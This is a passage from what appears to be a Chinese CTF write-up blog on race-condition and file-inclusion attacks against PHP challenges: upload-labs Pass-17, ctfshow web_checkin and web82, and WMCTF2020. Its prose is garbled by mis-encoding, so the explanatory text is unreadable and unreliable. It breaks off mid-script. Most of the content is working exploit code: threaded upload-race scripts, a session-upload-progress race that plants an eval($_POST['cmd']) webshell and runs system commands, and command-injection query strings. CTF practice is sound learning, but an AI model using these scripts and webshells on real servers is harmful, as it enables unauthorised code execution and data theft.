´ç»“æŸåï¼Œè®¿é—®pass.phpï¼Œå‡ºç°phpinfoä¿¡æ¯ï¼Œshellä¸Šä¼ æˆåŠŸ<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>æ–¹æ³•äºŒ</strong>ï¼špythoå¤šçº¿ç¨‹ä¸Šä¼ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;ä¸Šä¼ &#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure><p>è®¿é—®pass2.phpï¼Œä¹Ÿèƒ½çœ‹åˆ°phpinfoé¡µé¢<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ctfhsow-å¤§ç‰›æ¯-web-checkin"><a href="#ctfhsow-å¤§ç‰›æ¯-web-checkin" class="headerlink" title="ctfhsow [å¤§ç‰›æ¯]-web_checkin"></a>ctfhsow [å¤§ç‰›æ¯]-web_checkin</h3><p>çœ‹<a href="https://blog.csdn.net/miuzzx/article/details/116352564">ç¾½å¸ˆå‚…</a>çš„å¤§ç‰›æ¯wpï¼Œå‘ç°ç”¨åˆ°äº†æ¡ä»¶ç«äº‰æ¼æ´ï¼Œç…§ç€wpå¤ç°ä¸€ä¸‹ã€‚</p><p>éšä¾¿ä¼ å‚ä¸€ä¸ªcode=1,F12æŸ¥çœ‹æºç ï¼Œæ³¨é‡Šæç¤ºä»…å…è®¸index.phpå­˜åœ¨ï¼Œåˆ é™¤æ‰€æœ‰å…¶ä»–æ–‡ä»¶ï¼Œä»è¿™å¥è¯é‡Œå¯ä»¥çŒœæµ‹å«æœ‰æ¡ä»¶ç«äº‰æ¼æ´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- ä»…å…è®¸index.phpå­˜åœ¨ï¼Œåˆ é™¤æ‰€æœ‰å…¶ä»–æ–‡ä»¶ --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09*`<br></code></pre></td></tr></table></figure><p>è¯»å–åˆ°éƒ¨åˆ†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`nl*`<br> <span class="hljs-number">2</span><span class="hljs-meta">?&gt;</span><br> <span class="hljs-number">3</span><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">4</span>    opendir(<span class="hljs-string">&quot;./&quot;</span>);<br> <span class="hljs-number">5</span>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$filename</span> = readdir()) &#123;<br> <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br> <span class="hljs-number">7</span>            unlink(<span class="hljs-variable">$filename</span>);<br> <span class="hljs-number">8</span>        &#125;<br> <span class="hljs-number">9</span>    &#125;<br><span class="hljs-number">10</span>    closedir();<br><span class="hljs-number">11</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆæ–‡ä»¶atkx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`nl%09/*&gt;atkx`<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ç¾½å¸ˆå‚…çš„è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œå°†æºç å†™å…¥atkxä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url1)<br>def read():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url2)<br><span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#éšä¾¿getä¼ ä¸€æ¬¡å°±èƒ½å¾—åˆ°è¿™ä¸ªé•¿åº¦</span><br>    <span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>t.start()<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®atkxå¯ä»¥è¯»å–åˆ°æºç <br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æƒ³è¦å¾—åˆ°flagçš„è¯ï¼Œç›´æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è€ƒæŸ¥</strong>ï¼šåˆ©ç”¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>è¿›è¡Œæ–‡ä»¶åŒ…å«</p><ul><li>å‰æ: éœ€è¦çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚</li><li>æ€è·¯: åˆ©ç”¨session.upload_progresså°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚</li></ul><p>session.upload_progress æ˜¯PHP5.4çš„æ–°ç‰¹å¾ã€‚<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>php.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>session.use_strict_mode=offè¿™ä¸ªé€‰é¡¹é»˜è®¤å€¼ä¸ºoffï¼Œè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionidå¯æ§ã€‚è¿™ä¸€ç‚¹è‡³å…³é‡è¦ï¼Œä¸‹é¢ä¼šç”¨åˆ°ã€‚<span class="hljs-number">1.</span> session.upload_progress.enabled = on<br>enabled=onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›<br><br><span class="hljs-number">2.</span> session.upload_progress.cleanup = on<br>cleanup=onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›<br><br><span class="hljs-number">3.</span> session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å<br><br><span class="hljs-number">4.</span> session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›<br><br><span class="hljs-number">5.</span>session.use_strict_mode=off<br>è¿™ä¸ªé€‰é¡¹é»˜è®¤å€¼ä¸ºoffï¼Œè¡¨ç¤ºå¯¹Cookieä¸­sessionidå¯æ§ã€‚<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>çš„æ¡ä»¶ä¸‹,ä¸Šä¼ æ–‡ä»¶ï¼Œä¾¿ä¼šåœ¨<code>session[&#39;upload_progress_123&#39;]</code>ä¸­å‚¨å­˜ä¸€äº›æœ¬æ¬¡ä¸Šä¼ ç›¸å…³çš„ä¿¡æ¯,å‚¨å­˜åœ¨<code>/tmp/sess_Sn0w</code>ä¸­</p><p>Sessionçš„é»˜è®¤ä¿å­˜è·¯å¾„<br>åœ¨php.inié‡Œçš„é…ç½®session.save_pathæ˜¯æ³¨é‡Šæ‰çš„ï¼Œé‚£ä¹ˆSeesionä¿å­˜çš„è·¯å¾„åœ¨ä¸åŒç±»å‹æ“ä½œç³»ç»Ÿä¿å­˜åœ¨ä»€ä¹ˆä½ç½®ï¼Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linuxï¼š<br>/tmp æˆ– /var/lib/php/session<br><br>Windowsï¼š<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°phpstudyä¸­æ‰¾åˆ°sessionçš„å­˜å‚¨ä½ç½®<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç†è®ºå…·ä½“å‚è€ƒï¼š<a href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p><p>è§£é¢˜æ–¹æ³•1ï¼šburpsiteæ¡ä»¶ç«äº‰</p><p>æœ¬åœ°htmlå‘æŒ‡å®šç½‘å€ä¸Šä¼ æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bpè®¾ç½®ï¼ŒCookieé‡Œè®¾ç½®<code>PHPSESSID=flag</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_flag</code>ï¼Œåˆ©ç”¨session.upload_progresså†™å…¥æ¶æ„è¯­å¥<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>GETæ–¹å¼è®¿é—®?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>session.upload_progress.cleanup</code>æ˜¯å¼€å¯çš„ï¼Œä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œå®ƒå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œåˆ©ç”¨æ¡ä»¶ç«äº‰åº”ä»˜è¿™ç§æƒ…å†µ<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çŸ¥é“ç›®å½•æ–‡ä»¶åä¸ºflag.phpï¼Œä¿®æ”¹ä¸€å¥è¯æœ¨é©¬ä¸ºcat flag.php,ç»§ç»­ç«äº‰è¯»å–flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£é¢˜æ–¹æ³•2ï¼špythonè„šæœ¬å®ç°ç«äº‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>è¯»åˆ°flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿®æ”¹ä¸€å¥è¯æœ¨é©¬ä¸ºcat flag.phpï¼Œè¯»å–flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ctfhshow-webå…¥é—¨-web82"><a href="#ctfhshow-webå…¥é—¨-web82" class="headerlink" title="ctfhshow [webå…¥é—¨]-web82"></a>ctfhshow [webå…¥é—¨]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿä»£ç ï¼Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¤§éƒ¨åˆ†çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå’Œæ¡ä»¶ç«äº‰è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚</p><p>å’Œä¸Šé¢é¢˜ä¸€æ ·ï¼Œç›´æ¥ä¸€æŠŠæ¢­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 